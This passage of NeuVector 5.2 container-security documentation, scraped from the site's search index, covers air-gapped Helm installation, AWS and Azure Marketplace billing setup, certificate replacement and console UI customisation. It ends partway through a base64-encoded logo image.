core-2.4.0.tgz. The version may vary, but this is correct. This is the downloaded chart. Now we need the images. Good thing we can use the chart to figure this out.  # create image list helm template neuvector/core-*.tgz | awk '$1 ~ /image:/ {print $2}' | sed -e 's/\\&quot;//g' &gt; neuvector/images/list.txt # get images for i in $(cat neuvector/images/list.txt); do skopeo copy docker://$i docker-archive:neuvector/images/$(echo $i| awk -F/ '{print $3}'|sed 's/:/_/g').tar:$(echo $i| awk -F/ '{print $3}') done   Fantastic, we should have a directory that looks like:  [root@flux ~]# ls -lR neuvector neuvector: total 16 -rw-r--r--. 1 root root 15892 Jan 8 14:33 core-2.4.0.tgz drwxr-xr-x. 2 root root 153 Jan 8 14:35 images neuvector/images: total 953920 -rw-r--r--. 1 root root 236693504 Jan 8 14:35 controller_5.3.0.tar -rw-r--r--. 1 root root 226704384 Jan 8 14:35 enforcer_5.3.0.tar -rw-r--r--. 1 root root 176 Jan 8 14:34 list.txt -rw-r--r--. 1 root root 331550208 Jan 8 14:35 manager_5.3.0.tar -rw-r--r--. 1 root root 169589760 Jan 8 14:35 scanner_latest.tar -rw-r--r--. 1 root root 12265472 Jan 8 14:35 updater_latest.tar   And we can compress and move everything.  ","version":"5.2","tagName":"h3"},{"title":"Compress and Move​","type":1,"pageTitle":"Air Gapping NeuVector","url":"/5.2/deploying/airgap#compress-and-move","content":" Compressing is fairly simple. We will use tar with the ZST format for maximum compression.  # compress tar -I zstd -vcf neuvector_airgap.zst neuvector   Now simply move the 400M neuvector_airgap.zst to your network.  ","version":"5.2","tagName":"h3"},{"title":"Uncompress and Load​","type":1,"pageTitle":"Air Gapping NeuVector","url":"/5.2/deploying/airgap#uncompress-and-load","content":" All we need to do now is uncompress with a similar command. The following will output to director called neuvector.  tar -I zstd -vxf neuvector_airgap.zst   Loading the images into a registry is going to require an understanding of your internal network. For this doc let's use &quot;registry.awesome.sauce&quot; as the DNS name. Loading the images is fairly simple again with skopeo. Please make sure it is installed on the &quot;inside&quot; machine. You will probably need to authenticate with skopeo login for it to work.  # skopeo load export REGISTRY=registry.awesome.sauce for file in $(ls neuvector/images | grep -v txt ); do skopeo copy docker-archive:neuvector/images/$file docker://$(echo $file | sed 's/.tar//g' | awk -F_ '{print &quot;'$REGISTRY'/neuvector/&quot;$1&quot;:&quot;$2}') done   With all the images loaded in a registry we can install with Helm.  ","version":"5.2","tagName":"h3"},{"title":"Deploy with Helm​","type":1,"pageTitle":"Air Gapping NeuVector","url":"/5.2/deploying/airgap#deploy-with-helm","content":" Deploying with Helm is fairly straight forward. There are a few values that are needed to insure the images are pulling from the local registry. Here is a good example. You may need to tweak a few settings. Please follow the Helm best practices for values.yaml. Note the imagePullSecrets field. This is the secret for your cluster to authenticate to the registry.  # helm install example # variables export REGISTRY=registry.awesome.sauce # registry URL export NEU_URL=neuvector.awesome.sauce # neuvector URL # helm all the things -- read all the options being set helm upgrade -i neuvector --namespace neuvector neuvector/core --create-namespace --set imagePullSecrets=regsecret --set k3s.enabled=true --set k3s.runtimePath=/run/k3s/containerd/containerd.sock --set manager.ingress.enabled=true --set controller.pvc.enabled=true --set controller.pvc.capacity=10Gi --set manager.svc.type=ClusterIP --set registry=$REGISTRY --set tag=5.3.0 --set controller.image.repository=neuvector/controller --set enforcer.image.repository=neuvector/enforcer --set manager.image.repository=neuvector/manager --set cve.updater.image.repository=neuvector/updater --set manager.ingress.host=$NEU_URL  ","version":"5.2","tagName":"h3"},{"title":"Azure Marketplace Billing","type":0,"sectionRef":"#","url":"/5.2/deploying/azuremarketplace","content":"","keywords":"","version":"5.2"},{"title":"Deploy NeuVector from Azure Marketplace Pay-As-You-Go Listing​","type":1,"pageTitle":"Azure Marketplace Billing","url":"/5.2/deploying/azuremarketplace#deploy-neuvector-from-azure-marketplace-pay-as-you-go-listing","content":" NeuVector Prime supports monthly billing through your Azure account in a Pay-As-You-Go (PAYG) billing subscription for SUSE support of NeuVector.  Usage is billed monthly based on the average number of nodes protected by NeuVector during the month. Please see the Azure Marketplace listing for your appropriate region for specific pricing tiers and other information.  NeuVector Prime with 24x7 Support (non-EU and non-UK only)NeuVector Prime with 24x7 Support (EU and UK only)  Additional Usage Instructions can be found here.  note Azure Private Offers are available for NeuVector for special pricing situations in lieu of standard PAYG pricing.  ","version":"5.2","tagName":"h3"},{"title":"Supported Configurations​","type":1,"pageTitle":"Azure Marketplace Billing","url":"/5.2/deploying/azuremarketplace#supported-configurations","content":" The marketplace PAYG listing supports deployment on supported target environments only. As of the July release, only AKS is supported for the billing adapter (see below options for other environments such as Rancher, Kubernetes, OpenShift etc). Each cluster can report its usage (nodes) independently, or an aggregated node count for a multi-cluster deployment can be reported. An aggregated, multi-cluster deployment can take advantage of the volume discount tiers offered by pooling all nodes across clusters into a single usage billing calculation.  note All clusters in PAYG billing (single, primary, remotes) must be running NeuVector version 5.2.2 or later.  Single Cluster Usage Billing​  Each cluster onto which you have deployed the PAYG billing adapter through the marketplace will report usage information for your Azure account.  Multi-cluster Usage Billing​  To be able to aggregate the node counts from multiple clusters in order to take advantage of volume discounts, the clusters must have been configured for Multi-cluster federation as described in the NeuVector docs. NeuVector on the Primary cluster MUST have been deployed through the Azure Marketplace, with the billing adapter installed in the primary cluster, in order to be able to report the primary and all downstream remote cluster node counts. Do not deploy NeuVector through the marketplace on downstream remote clusters. Use standard deployment methods (Helm, Operator, kubectl etc) described in the NeuVector docs on remote clusters.  Enabling PAYG NeuVector Prime Billing for Existing NeuVector Clusters​  There are several options to enable NeuVector Prime billing on existing NeuVector clusters.  Option 1: The existing cluster must be on a supported PAYG platform. Backup the NeuVector configuration of the existing cluster, remove the NeuVector deployment, then deploy NeuVector through the Azure marketplace. After successful deployment, import the backup configuration. Note: It is recommended that the existing cluster be running version NeuVector 5.2.2 or later before the backup and removal. Option 2: Add the existing cluster as a federated remote cluster to a (existing or newly deployed) primary cluster which already has PAYG billing deployed on it. In this case, the existing cluster can be on any platform supported by NeuVector.  Enabling PAYG NeuVector Prime Billing for Rancher, OpenShift, Tanzu, or other NeuVector supported clusters​  Although PAYG billing deployment is supported on a limited set of Azure platforms (only AKS at initial November 2023 release), billing for other supported NeuVector platforms can be accomplished using the multi-cluster federation configuration. As long as the primary cluster has the PAYG billing deployment of NeuVector, downstream clusters can be any supported NeuVector clusters such as Rancher, Kubernetes, OpenShift, or Tanzu. Downstream clusters can even be on-premise, or on other clouds as long as the remote cluster can be federated to the primary (with appropriate network access).  For Rancher managed downstream clusters with SSO to NeuVector, these clusters can be federated to a non-Rancher primary cluster which is deployed through the Azure marketplace in order to benefit from consolidated multi-cluster billing.  ","version":"5.2","tagName":"h3"},{"title":"Deploying NeuVector Prime through the Azure Marketplace​","type":1,"pageTitle":"Azure Marketplace Billing","url":"/5.2/deploying/azuremarketplace#deploying-neuvector-prime-through-the-azure-marketplace","content":" A special billing interface is required to enable PAYG to your Azure account. This must be deployed, together with NeuVector from the Azure Marketplace listing for NeuVector. To deploy the billing adapter and NeuVector see the Usage instructions.  Setting the Admin Password​  It is required to set the admin password in the Azure create offer, &quot;NeuVector Configuration&quot; section. See the Usage instructions on the Azure marketplace listing for NeuVector for instructions.  Console Login through Load Balancer​  If the manager service type was set to Load Balancer during install, an external IP (URL) has been assigned for logging into the NeuVector console. Typically, this URL is accessible from the internet, but your organization may have placed additional restrictions on external access to your cluster. To see the load balancer, type:  kubectl get svc -n neuvector neuvector-service-webui   To get the full login url, type:  SERVICE_IP=$(kubectl get svc --namespace neuvector neuvector-service-webui -o jsonpath=&quot;{.status.loadBalancer.ingress[0].ip}&quot;) echo https://$SERVICE_IP:8443   And you will see something like:  https://&lt;$SERVICE_IP&gt;:8443   This is how you can access the NeuVector console from your browser on the default port 8443.  Once logged in, you can begin to navigate and configure NeuVector.  ","version":"5.2","tagName":"h3"},{"title":"Obtaining Support​","type":1,"pageTitle":"Azure Marketplace Billing","url":"/5.2/deploying/azuremarketplace#obtaining-support","content":" Once PAYG billing is enabled for a cluster or multiple clusters, customers are eligible for support through the SUSE Support Center (SCC) service. This is a web-based service for creating, viewing, and managing support requests. The actual link for submitting your support bundle as described below can be found here.  The SCC portal will require you to upload a Support Configuration bundle in order to verify your eligibility as well as provide cluster information required to start investigations. To download the support config, please go to Settings -&gt; Configuration at the bottom of the page for the cluster in question. For multi-cluster configurations, only the Primary cluster's support config is required, even if the support inquiry is for a downstream remote cluster. If you do not have access to the Primary cluster, the remote cluster's support config is acceptable.  ","version":"5.2","tagName":"h3"},{"title":"Upgrading a NeuVector PAYG Cluster​","type":1,"pageTitle":"Azure Marketplace Billing","url":"/5.2/deploying/azuremarketplace#upgrading-a-neuvector-payg-cluster","content":" The Azure NeuVector Prime offer consists of several different containers. As newer versions of these containers are released, updated application bundles will be published to the Azure Marketplace. To upgrade to the most recent version that is specified in the marketplace listing, see the Usage instructions. ","version":"5.2","tagName":"h3"},{"title":"Replacing Self-Signed Certificate","type":0,"sectionRef":"#","url":"/5.2/configuration/console/replacecert","content":"","keywords":"","version":"5.2"},{"title":"Replacing the Self-Signed Certificate with PKCS Certificate for External Access​","type":1,"pageTitle":"Replacing Self-Signed Certificate","url":"/5.2/configuration/console/replacecert#replacing-the-self-signed-certificate-with-pkcs-certificate-for-external-access","content":" The built-in self-signed certificate used for external access from a browser to the Manager or for the REST API to the Controller can be replaced by a supported PKCS certificate. These should be replaced in both the Manager and Controller deployments. Note: To replace the included certificates for Internal communication between the Controller, Enforcer, and Scanner, please see this section.  The NeuVector web console supports 2 different self-signed certificate types, specifically, the PKCS8 (Private-Key Information Syntax Standard) and PKCS1 (RSA Cryptography Standard). The self-signed certificate can be replaced with either of these PKCS types.  The steps to generate the secret that will be consumed by NeuVector’s web console originating from the key and certificate using either of the PKCS methods will be illustrated below. The important note here is, with the use of the wildcard for the DNS as being part of the alternate-subject-name parameter during the key and certificate creation, this enables the name of your choosing to be mapped to the Management console IP-Address without restricting to a particular CN.  Generate and Use Self-signed Certificate PKCS8 or PCKS1​  Create a key and certificate  PKCS8​  openssl req -x509 -nodes -days 730 -newkey rsa:2048 -keyout tls.key -out tls.pem -config ca.cfg -extensions 'v3_req' Sample ca.cfg [req] distinguished_name = req_distinguished_name x509_extensions = v3_req prompt = no [req_distinguished_name] C = US ST = California L = San Jose O = NeuVector Inc. OU = Neuvector CN = Neuvector [v3_req] keyUsage = keyEncipherment, dataEncipherment extendedKeyUsage = serverAuth subjectAltName = @alt_names [alt_names] DNS.1 = *   PKCS1​  openssl genrsa -out tls.key 2048 openssl req -x509 -nodes -days 730 -config openssl.cnf -new -key tls.key -out tls.pem Sample openssl.cnf [req] distinguished_name = req_distinguished_name x509_extensions = v3_req prompt = no [req_distinguished_name] C = US ST = California L = San Jose O = NeuVector Inc. OU = Neuvector CN = Neuvector(PKCS#1) [v3_req] keyUsage = keyEncipherment, dataEncipherment extendedKeyUsage = serverAuth subjectAltName = @alt_names [alt_names] DNS.1 = *   Create the secret from the generated key and certificate files from above  kubectl create secret generic https-cert -n neuvector --from-file=tls.key --from-file=tls.pem   Edit the yaml directly for the manager and controller deployments to add the mounts  spec: template: spec: containers: volumeMounts: - mountPath: /etc/neuvector/certs/ssl-cert.key name: cert readOnly: true subPath: tls.key - mountPath: /etc/neuvector/certs/ssl-cert.pem name: cert readOnly: true subPath: tls.pem volumes: - name: cert secret: defaultMode: 420 secretName: https-cert   Or update with the helm chart with similar values.yaml  manager: certificate: secret: https-cert keyFile: tls.key pemFile: tls.pem ingress: enabled: true host: %CHANGE_HOST_NAME% ingressClassName: &quot;&quot; path: &quot;/&quot; # or this could be &quot;/api&quot;, but might need &quot;rewrite-target&quot; annotation annotations: ingress.kubernetes.io/protocol: https tls: true secretName: https-cert controller: certificate: secret: https-cert keyFile: tls.key pemFile: tls.pem   Then update with helm upgrade -i neuvector .... For reference here are all the values https://github.com/neuvector/neuvector-helm/tree/master/charts/core.  Support chained certificates​  To support End-to-end TLS, some ingresses/Application Gateways will only support backend servers that can be trusted. NeuVector added support for chained certificates in version 3.2.2. Microsoft's Application Gateway is one example of an Application Gateway requiring a chained certificate when using a not well-known CA.  To add a chained certificate, the example tls.pem file should be a concatenation of the certificates. ","version":"5.2","tagName":"h3"},{"title":"AWS Marketplace Billing","type":0,"sectionRef":"#","url":"/5.2/deploying/awsmarketplace","content":"","keywords":"","version":"5.2"},{"title":"Deploy NeuVector from AWS Marketplace Pay-As-You-Go Listing​","type":1,"pageTitle":"AWS Marketplace Billing","url":"/5.2/deploying/awsmarketplace#deploy-neuvector-from-aws-marketplace-pay-as-you-go-listing","content":" NeuVector Prime supports monthly billing through your AWS account in a Pay-As-You-Go (PAYG) billing subscription for SUSE support of NeuVector.  Usage is billed monthly based on the average number of nodes protected by NeuVector during the month. Please see the NeuVector marketplace listing for your region for specific pricing tiers and other information.  NeuVector Prime with 24x7 Support (non-EU and non-UK only)NeuVector Prime with 24x7 Support (EU and UK only)  note AWS Private Offers are available for NeuVector for special pricing situations in lieu of standard PAYG pricing.  ","version":"5.2","tagName":"h3"},{"title":"Supported Configurations​","type":1,"pageTitle":"AWS Marketplace Billing","url":"/5.2/deploying/awsmarketplace#supported-configurations","content":" The marketplace PAYG listing supports deployment on supported target environments only. As of the July release, only EKS is supported for the billing adapter (see below options for other environments such as Rancher, Kubernetes, OpenShift etc). Each cluster can report its usage (nodes) independently, or an aggregated node count for a multi-cluster deployment can be reported. An aggregated, multi-cluster deployment can take advantage of the volume discount tiers offered by pooling all nodes across clusters into a single usage billing calculation.  note All clusters in PAYG billing (single, primary, remotes) must be running NeuVector version 5.2.0 or later.  Single Cluster Usage Billing​  Each cluster onto which you have deployed the PAYG billing adapter through the marketplace will report usage information for your AWS account.  Multi-cluster Usage Billing​  To be able to aggregate the node counts from multiple clusters in order to take advantage of volume discounts, the clusters must have been configured for Multi-cluster federation as described in the NeuVector docs. NeuVector on the Primary cluster MUST have been deployed through the AWS Marketplace, with the billing adapter installed in the primary cluster, in order to be able to report the primary and all downstream remote cluster node counts. Do not deploy NeuVector through the marketplace on downstream remote clusters. Use standard deployment methods (Helm, Operator, kubectl etc) described in the NeuVector docs on remote clusters.  Enabling PAYG NeuVector Prime Billing for Existing NeuVector Clusters​  There are several options to enable NeuVector Prime billing on existing NeuVector clusters.  Option 1: The existing cluster must be on a supported PAYG platform. Backup the NeuVector configuration of the existing cluster, remove the NeuVector deployment, then deploy NeuVector through the AWS marketplace. After successful deployment, import the backup configuration. Note: It is recommended that the existing cluster be running version NeuVector 5.2.0 or later before the backup and removal. For Helm based deployments, this is a sample Helm upgrade command (replacing account ID, IAM role name, previous helm version values file etc):  helm upgrade -n neuvector neuvector oci://709825985650.dkr.ecr.us-east-1.amazonaws.com/suse/neuvector-csp-billing-adapter-llc/core --version 2.4.30002023052201 --create-namespace \\ --set awsbilling.accountNumber=$AWS_ACCT_ID,awsbilling.roleName=$IAM_ROLE_NAME \\ --set awsbilling.enabled=true,containerd.enabled=true -f values-x.y.z.yaml   Option 2: Add the existing cluster as a federated remote cluster to a (existing or newly deployed) primary cluster which already has PAYG billing deployed on it. In this case, the existing cluster can be on any platform supported by NeuVector.  Enabling PAYG NeuVector Prime Billing for Rancher, OpenShift, Tanzu, or other NeuVector supported clusters​  Although PAYG billing deployment is supported on a limited set of AWS platforms (only EKS at initial July release), billing for other supported NeuVector platforms can be accomplished using the multi-cluster federation configuration. As long as the primary cluster has the PAYG billing deployment of NeuVector, downstream clusters can be any supported NeuVector clusters such as Rancher, Kubernetes, OpenShift, or Tanzu. Downstream clusters can even be on-premise, or on other clouds as long as the remote cluster can be federated to the primary (with appropriate network access).  For Rancher managed downstream clusters with SSO to NeuVector, these clusters can be federated to a non-Rancher primary cluster which is deployed through the AWS marketplace in order to benefit from consolidated multi-cluster billing.  ","version":"5.2","tagName":"h3"},{"title":"Deploying NeuVector Prime through the AWS Marketplace​","type":1,"pageTitle":"AWS Marketplace Billing","url":"/5.2/deploying/awsmarketplace#deploying-neuvector-prime-through-the-aws-marketplace","content":" A special billing interface is required to enable PAYG to your AWS account. This must be deployed, together with NeuVector from the AWS Marketplace listing for NeuVector. To deploy the billing adapter and NeuVector see the Usage instructions for your region in the marketplace listing above.  The helm install command uses defaults in the values.yaml file. Important defaults to check are the manager service type (LoadBalancer) and container run-time (containerd - which is the typical default for EKS clusters). The default admin username is disabled, and users are required to set a username and password through a secret prior to deployment.  Setting the Admin Username and Password​  It is required to set the admin username and password as a Kubernetes secret prior to deployment.  kubectl create secret generic neuvector-init --from-file=userinitcfg.yaml -n neuvector   note The above step is mandatory, otherwise an admin user will not be created upon NeuVector deployment, making the NeuVector deployment unmanageable.  Sample userinitcfg.yaml content:  users: - Fullname: admin Password: (ValidPassword) Role: admin # 8 character(s) minimum,1 uppercase character(s),1 lowercase character(s), 1 number(s).   Sample helm install command:  helm install -n neuvector neuvector --create-namespace \\ oci://709825985650.dkr.ecr.us-east-1.amazonaws.com/suse/neuvector-csp-billing-adapter-llc/core --version 2.6.1 \\ --set awsbilling.accountNumber=$AWS_ACCOUNT_ID \\ --set awsbilling.roleName=$ROLE_NAME \\ --set manager.svc.type=LoadBalancer   See the Usage instructions on the AWS marketplace listing for detailed NeuVector instructions.  Console Login through Load Balancer​  If the manager service type was set to Load Balancer during install, an external IP (URL) has been assigned for logging into the NeuVector console. Typically, this URL is accessible from the internet, but your organization may have placed additional restrictions on external access to your cluster. To see the load balancer, type:  kubectl get svc -n neuvector neuvector-service-webui   To get the full login url, type:  SERVICE_IP=$(kubectl get svc --namespace neuvector neuvector-service-webui -o jsonpath=&quot;{.status.loadBalancer.ingress[0].hostname}&quot;) echo https://$SERVICE_IP:8443   And you will see something like:  https://a2647ecdxx33498948a70eea84c5-18386345695.us-west-2.elb.amazonaws.com:8443   This is how you can access the NeuVector console from your browser on the default port 8443.  Once logged in, you can begin to navigate and configure NeuVector.  note The NeuVector scanner image is updated daily with a new CVE database on the NeuVector docker hub registry. It is recommended that the image path be changed to allow for automated daily updates by modifying the scanner and updater image paths AFTER successful initial deployment. For example: kubectl set image deploy/neuvector-scanner-pod neuvector-scanner-pod=docker.io/neuvector/scanner:latest kubectl set image cronjob/neuvector-updater-pod neuvector-updater-pod=docker.io/neuvector/updater:latest   ","version":"5.2","tagName":"h3"},{"title":"Obtaining Support​","type":1,"pageTitle":"AWS Marketplace Billing","url":"/5.2/deploying/awsmarketplace#obtaining-support","content":" Once PAYG billing is enabled for a cluster or multiple clusters, customers are eligible for support through the SUSE Support Center (SCC) service. This is a web-based service for creating, viewing, and managing support requests. The actual link for submitting your support bundle as described below can be found here.  The SCC portal will require you to upload a Support Configuration bundle in order to verify your eligibility as well as provide cluster information required to start investigations. To download the support config, please go to Settings -&gt; Configuration at the bottom of the page for the cluster in question. For multi-cluster configurations, only the Primary cluster's support config is required, even if the support inquiry is for a downstream remote cluster. If you do not have access to the Primary cluster, the remote cluster's support config is acceptable.  ","version":"5.2","tagName":"h3"},{"title":"Upgrading a NeuVector PAYG Cluster​","type":1,"pageTitle":"AWS Marketplace Billing","url":"/5.2/deploying/awsmarketplace#upgrading-a-neuvector-payg-cluster","content":" The AWS marketplace PAYG listing helm chart is tied to a specific billing adapter AND NeuVector version. These are updated periodically as new versions of the billing adapter or NeuVector are released. To update the NeuVector version to the latest version supported by the marketplace listing, use the Helm update command as normal. To update the NeuVector version to a more recent version than is specified in the marketplace listing, manually change the helm values for the images (registry, paths, version tags) to point to the desired version (e.g. docker.io, neuvector/controller:5.2.5). ","version":"5.2","tagName":"h3"},{"title":"Custom Login, Header and Footer","type":0,"sectionRef":"#","url":"/5.2/configuration/customui","content":"","keywords":"","version":"5.2"},{"title":"Customizing the Console (UI) Component​","type":1,"pageTitle":"Custom Login, Header and Footer","url":"/5.2/configuration/customui#customizing-the-console-ui-component","content":" This guide will help you customize the console with the following options:  1. Customize the Login Logo​  To customize the login logo, follow these steps:  Create a 300x80 pixels SVG file.Base64 encode the SVG file.Save the encoded file to the environment variable CUSTOM_LOGIN_LOGO.  2. Customize the Acceptance Policy (e.g. Terms of Use)​  To customize the policy, follow these steps:  The policy content can be plain HTML or text.Base64 encode the policy content.Save the encoded content to the environment variable CUSTOM_EULA_POLICY.  3. Customize the Page Banner (Shown on every page)​  To customize the page banner, follow these steps:  Header Customization​  Customize the header's content and color.The color of the header banner is required.The color value can be a color keyword (e.g., yellow) or a Hex value (e.g., #ffff00).The content is optional and can be one line of plain HTML or text with a maximum of 120 characters.Base64 encode the header content.Save the encoded content to the environment variables CUSTOM_PAGE_HEADER_COLOR and CUSTOM_PAGE_HEADER_CONTENT.  Footer Customization​  Customize the footer's content and color.The color of the footer banner will be the same as the header banner if the color is not customized.The content is optional and can be one line of plain HTML or text with a maximum of 120 characters.Base64 encode the footer content.Save the encoded content to the environment variables CUSTOM_PAGE_FOOTER_COLOR and CUSTOM_PAGE_FOOTER_CONTENT.  The environment variables (CUSTOM_LOGIN_LOGO, CUSTOM_EULA_POLICY, CUSTOM_PAGE_HEADER_COLOR, CUSTOM_PAGE_HEADER_CONTENT, CUSTOM_PAGE_FOOTER_COLOR, CUSTOM_PAGE_FOOTER_CONTENT) can be defined in the values.yaml file in the helm chart. The corresponding section in the values.yaml file where these variables can be defined is &quot;manager.env.envs&quot;  4. Example to customize the UI pages using helm chart​  Prerequisites​  Before customizing the UI component, ensure that you have the following:  NeuVector Helm chart repository: https://github.com/neuvector/neuvector-helmNeuVector installed on your Kubernetes cluster  Steps​  Follow these steps to customize the UI component:  Locate the NeuVector Helm chart repository in your local environment: https://github.com/neuvector/neuvector-helm.Navigate to the neuvector-helm/charts/core directory.Edit the manager.env.envs in the values.yaml to add the environment variables. CUSTOM_PAGE_HEADER_COLOR: Set the banner color to DarkOrange (#ff8c00).CUSTOM_PAGE_HEADER_CONTENT: Specify the header text using a plain HTML or text, for example &quot;You are accessing a U.S. Government (USG) Information System (IS) that is provided for USG-authorized use only.&quot;, remember to based64 encode it.CUSTOM_EULA_POLICY: Customize the policy content using a plain HTML snippet or text and remember to base64 encode it.CUSTOM_LOGIN_LOGO: Customize the logo with a 300x80 pixel svg file and base64 encode it  manager: # If false, manager will not be installed enabled: true image: repository: nvpublic/ma hash: priorityClassName: env: ssl: true envs: - name: CUSTOM_PAGE_HEADER_COLOR value: &quot;#ff8c00&quot; - name: CUSTOM_PAGE_HEADER_CONTENT value: WW91IGFyZSBhY2Nlc3NpbmcgYSAmbmJzcDs8Yj4gVS5TLiBHb3Zlcm5tZW50IChVU0cpIEluZm9ybWF0aW9uIFN5c3RlbSAoSVMpIDwvYj4gICAgICB0aGF0IGlzIHByb3ZpZGVkIGZvciBVU0ctYXV0aG9yaXplZCB1c2Ugb25seS4= - name: CUSTOM_EULA_POLICY value: PGg0PgogIFlvdSBhcmUgYWNjZXNzaW5nIGEgVS5TLiBHb3Zlcm5tZW50IChVU0cpIEluZm9ybWF0aW9uIFN5c3RlbSAoSVMpIHRoYXQgaXMgcHJvdmlkZWQgZm9yIFVTRy1hdXRob3JpemVkIHVzZSBvbmx5LgpCeSB1c2luZyB0aGlzIElTICh3aGljaCBpbmNsdWRlcyBhbnkgZGV2aWNlIGF0dGFjaGVkIHRvIHRoaXMgSVMpLCB5b3UgY29uc2VudCB0byB0aGUgZm9sbG93aW5nIGNvbmRpdGlvbnM6CjwvaDQ+CjxwPgotVGhlIFVTRyByb3V0aW5lbHkgaW50ZXJjZXB0cyBhbmQgbW9uaXRvcnMgY29tbXVuaWNhdGlvbnMgb24gdGhpcyBJUyBmb3IgcHVycG9zZXMgaW5jbHVkaW5nLCBidXQgbm90IGxpbWl0ZWQgdG8sIHBlbmV0cmF0aW9uIHRlc3RpbmcsIENPTVNFQyBtb25pdG9yaW5nLCBuZXR3b3JrIG9wZXJhdGlvbnMgYW5kIGRlZmVuc2UsIHBlcnNvbm5lbCBtaXNjb25kdWN0IChQTSksIGxhdyBlbmZvcmNlbWVudCAoTEUpLCBhbmQgY291bnRlcmludGVsbGlnZW5jZSAoQ0kpIGludmVzdGlnYXRpb25zLgo8L3A+CjxwPgotQXQgYW55IHRpbWUsIHRoZSBVU0cgbWF5IGluc3BlY3QgYW5kIHNlaXplIGRhdGEgc3RvcmVkIG9uIHRoaXMgSVMuCjwvcD4K - name: CUSTOM_LOGIN_LOGO value: <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="300" height="80" xml:space="preserve" version="1.1" viewBox="0 0 300 80">
    <image width="300" height="80" xlink:href="data:image/png;base64,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